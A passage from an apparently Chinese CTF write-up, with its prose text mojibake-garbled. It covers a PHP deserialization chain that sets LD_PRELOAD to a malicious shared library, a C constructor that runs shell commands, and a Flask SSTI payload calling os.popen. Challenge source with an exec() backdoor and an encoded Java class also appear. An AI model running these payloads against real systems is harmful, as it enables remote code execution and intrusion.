punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘soæ–‡ä»¶å¹¶ç”¨base64è¾“å‡º</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hook_strncmp.c <span class="token parameter variable">-o</span> hook_strncmp.so base64 hook_strncmp.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"1.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FUN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706000251607.png" alt="image-20240706000251607"></p><p>å¾—åˆ°æ–‡ä»¶è·¯å¾„ï¼š<code>/tmp/29f91f211e3f3f46e167f664c28f6136.so</code></p><p>æ¥ä¸‹æ¥è§¦å‘<code>ENV::__toString</code>ï¼Œç”¨å­—ç¬¦ä¸²ä¸å¯¹è±¡çš„å¼±æ¯”è¾ƒè§¦å‘</p><p>é“¾å­ï¼š<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FILE::__get -&gt; ENV::__toString</code></p><p>ï¼ˆsoæ–‡ä»¶ä¸ä¸€æ ·æ˜¯å› ä¸ºæˆ‘ä¸ªfwåšè¶…æ—¶äº†xï¼‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"/tmp/1ce494339fd8f830fd8318acb4782917.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶è€Œæ²¡å¼¹å‡ºshell</p><p>å¯ä»¥ç”¨ä¸‹é¢çš„payloadçœ‹ä¸€ä¸‹LD_PRELOADå½“å‰çš„å€¼ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ENV"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"value"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"math"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"stdClass"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°LD_PRELOADæ˜¯ç©ºçš„ï¼Œçœ‹æ¥æ˜¯æ²¡å†™æˆ</p><p>hint.txtçš„å†…å®¹ï¼š<code>RCE!!!!!!!?????? Try every possible means!!!!! Remote Code Execution!!!! THIS_IS_FAKE_CAT!!!!</code></p><p>è¯´æ˜è¿™é‡Œä¸èƒ½ç›´æ¥åŠ«æŒcatå‘½ä»¤</p><p>é‚£å°±è€ƒè™‘åŠ«æŒç³»ç»Ÿæ–°è¿›ç¨‹æ¥ç»•è¿‡ï¼Œæµ‹è¯•å‘ç°å¥½åƒä¸å‡ºç½‘ï¼Œé‚£ä¹ˆç›´æ¥å†™æ–‡ä»¶å¸¦å¤–å³å¯</p><p>hack.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / > /var/www/html/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hack.c <span class="token parameter variable">-o</span> evil.so <span class="token parameter variable">-ldl</span>base64 evil.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span><span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706012644782.png" alt="image-20240706012644782"></p><p>å¾—åˆ°flagçš„ä½ç½®ï¼š&#x2F;flag_9e6244c7d4c5bd9cf815</p><p>æ•…æŠ€é‡æ–½å³å¯å¾—åˆ°flag</p><hr><h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><blockquote><p>flask ssti + udfææƒ</p></blockquote><p>è¿›å»ï¼Œç›´æ¥ç»™äº†ä¸ªå‚æ•°<code>name</code>ï¼Œçœ‹äº†ä¸‹æ¡†æ¶æ˜¯pythonçš„flaskï¼Œé‚£ç›´æ¥çŒœssti</p><p>æµ‹äº†ä¸‹å‘ç°æ²¡è¿‡æ»¤ï¼Œç›´æ¥ä¼ payloadå¼¹shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°åˆå¼¹ä¸äº†ï¼Œçœ‹æ¥ä¸å‡ºç½‘</p><p>å…ˆè¯»å‡ ä¸ªæ–‡ä»¶</p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p><a href="http://www.py/">www.py</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inedx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/?name=hello"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>api.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">,</span> time<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> socket<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mysql_keepalive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'ctf'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>        <span class="token string">'host'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'database'</span><span class="token punctuation">:</span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>        <span class="token string">'port'</span><span class="token punctuation">:</span> <span class="token number">6666</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        db_connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>config<span class="token punctuation">)</span>        cursor <span class="token operator">=</span> db_connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT VERSION();"</span><span class="token punctuation">)</span>            cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"è¿æ¥ä¸­æ–­: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>err<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handle_client_connection</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'&#123;"code":0, "path": ""&#125;'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error handling client: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>    port <span class="token operator">=</span> <span class="token number">7777</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"update_api Listening on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        handle_client_connection<span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/evil'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./evil.key"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"key error"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>mysql_keepalive<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>update_api<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹èµ·æ¥æ˜¯æœ¬åœ°è¿æ¥æ•°æ®åº“çš„æ¥å£</p><p>update.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">import</span> socket<span class="token keyword">import</span> tarfile<span class="token keyword">def</span> <span class="token function">extract_specific_file</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> file_name<span class="token punctuation">,</span> extract_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> <span class="token string">"r:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        file_info <span class="token operator">=</span> tar<span class="token punctuation">.</span>getmember<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file_info<span class="token punctuation">,</span> path<span class="token operator">=</span>extract_path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        js <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> js<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            extract_specific_file<span class="token punctuation">(</span>js<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'new.bin'</span><span class="token punctuation">,</span> <span class="token string">"/updatedir"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Error'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æœ‰evil.keyå’Œsql-proxy.jar</p><p>æ˜æ˜¾flagæ²¡æƒé™è¯»</p><p>é‚£æŠŠè¿™ä¸ªjaråŒ…å¯¼åˆ°æœ¬åœ°çœ‹çœ‹</p><p>Main.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Base64ClassLoader</span> base64ClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Base64ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls <span class="token operator">=</span> base64ClassLoader<span class="token punctuation">.</span><span class="token function">loadClassFromBase64</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADcArQoAIQBZCQAgAFoIAFsHAFwKAAQAXQoABABeCQBfAGAKAAoAYQoAYgBjBwBkCgAKAGUHAGYSAAAAawoADABsCgAMAG0SAAEAawcAbwoAEQBwBwBxCgAEAHIKABMAcwoACgB0CgAKAHUKAEwAdgoAIAB3CgBNAHIKAEwAcgoACgByCgBNAHgKAE0AeQoAIAB6BwB7BwB8AQABYwEAAUkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAMc291cmNlU29ja2V0AQARTGphdmEvbmV0L1NvY2tldDsBABFkZXN0aW5hdGlvblNvY2tldAEAE3NvdXJjZVRvRGVzdGluYXRpb24BABJMamF2YS9sYW5nL1RocmVhZDsBABNkZXN0aW5hdGlvblRvU291cmNlAQAFdmFyMTABABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR2YXI5AQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQAFdmFyMTEBAAxzZXJ2ZXJTb2NrZXQBABdMamF2YS9uZXQvU2VydmVyU29ja2V0OwEABXZhcjEyAQAEdGhpcwEAD0xjb20vY3RmL1Byb3h5OwEACnNvdXJjZVBvcnQBAA9kZXN0aW5hdGlvbkhvc3QBABJMamF2YS9sYW5nL1N0cmluZzsBAA9kZXN0aW5hdGlvblBvcnQBAA1TdGFja01hcFRhYmxlBwB9AQALZm9yd2FyZERhdGEBACUoTGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylWAQAGYnVmZmVyAQACW0IBAARyZWFkAQAEdmFyOAEADG91dHB1dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAR2YXI3AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAtpbnB1dFNvY2tldAEADG91dHB1dFNvY2tldAcAfgcAfwcAQgEABHNlbmQBABwoTGphdmEvaW8vT3V0cHV0U3RyZWFtO1tCSSlWAQABbwEABGRhdGEBAApFeGNlcHRpb25zBwCAAQAMbGFtYmRhJG5ldyQxAQAMbGFtYmRhJG5ldyQwAQAKU291cmNlRmlsZQEAClByb3h5LmphdmEMACQAJQwAIgAjAQAJMTI3LjAuMC4xAQAVamF2YS9uZXQvU2VydmVyU29ja2V0DAAkAIEMAIIAgwcAhAwAhQCGDACHAIgHAIkMAIoAiwEAD2phdmEvbmV0L1NvY2tldAwAJACMAQAQamF2YS9sYW5nL1RocmVhZAEAEEJvb3RzdHJhcE1ldGhvZHMPBgCNEAAlDwcAjgwAjwCQDAAkAJEMAJIAJQ8HAJMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACUACUBABNqYXZhL2xhbmcvVGhyb3dhYmxlDACVACUMAJYAlwwAmACZDACaAJsMAEMAnAwATwBQDACdAJ4